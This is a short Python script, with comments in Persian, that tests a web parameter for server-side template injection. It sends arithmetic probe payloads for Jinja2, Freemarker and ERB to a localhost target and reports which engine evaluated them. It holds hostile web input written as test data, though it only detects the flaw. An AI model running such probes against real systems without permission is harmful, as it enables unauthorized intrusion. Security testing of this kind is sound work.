import requests
from urllib.parse import quote

def test_ssti(url, param):
    print("[*] Testing SSTI on: " + url)
    
    # پیلودهای ریاضی برای موتورهای تمپلیت مختلف
    payloads = [
        ("{{7*7}}", "49", "Jinja2 / Twig (Python/PHP)"),
        ("${7*7}", "49", "Freemarker / Mako (Java/Python)"),
        ("<%= 7*7 %>", "49", "ERB (Ruby)")
    ]
    
    for payload, expected, engine in payloads:
        encoded_payload = quote(payload)
        test_url = url + "?" + param + "=" + encoded_payload
        
        try:
            r = requests.get(test_url, timeout=3)
            
            # اگه نتیجه ریاضی توی پاسخ دیده شد، یعنی باگ داره
            if expected in r.text:
                print("\n[+] SSTI FOUND!")
                print("    Engine: " + engine)
                print("    Payload: " + payload)
                print("    Expected Result: " + expected)
                print("    The server evaluated our code!")
                return True
        except Exception:
            pass
            
    print("\n[-] No SSTI detected.")
    return False

if __name__ == "__main__":
    target = "http://127.0.0.1:8000/greet"
    test_ssti(target, "name")
